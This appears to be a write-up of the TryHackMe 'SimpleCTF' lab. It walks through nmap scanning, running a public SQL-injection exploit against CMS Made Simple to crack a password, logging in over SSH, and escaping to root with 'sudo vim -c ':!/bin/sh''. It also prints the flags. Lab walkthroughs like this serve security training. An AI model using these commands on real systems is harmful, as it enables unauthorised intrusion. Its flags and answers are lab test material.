---
title: Box - SimpleCTF
published: true
---

Begginner level CTF

* * *

## How many services are running under port 1000?

- ``sudo nmap -T4 10.10.35.218 -p- -vvv``

```shell
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 61
80/tcp   open  http         syn-ack ttl 61
2222/tcp open  EtherNetIP-1 syn-ack ttl 61
```

* * *

## What is running on the higher port?

-  ``sudo nmap -sC -sV -O -T4 10.10.35.218 -p2222``

```shell
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
```

* * *

## What's the CVE you're using against the application?

```shell
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/SimpleCTF]
└─$ searchsploit -p 46635 
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
File Type: Python script, ASCII text executable
```

* * *

## To what kind of vulnerability is the application vulnerable?

- SQLi

* * *

## What's the password?

- ``python2 46635.py -u http://10.10.35.218/simple --crack -w /usr/share/seclists/Passwords/rockyou.txt``

```shell
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

* * *

## Where can you login with the details obtained?

- ssh

* * *

## What's the user flag?

```shell
$ cat user.txt
G00d j0b, keep up!
```

* * *

## Is there any other user in the home directory? What's its name?

```shell
$ cd ..
$ ls -las
total 16
4 drwxr-xr-x  4 root    root    4096 aug 17  2019 .
4 drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
4 drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
4 drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
```

* * *

## What can you leverage to spawn a privileged shell?

- ``sudo -l``
- vim
- ``sudo vim -c ':!/bin/sh'``

* * *

## What's the root flag?

```shell
# cat root.txt
W3ll d0n3. You made it!
```

* * *
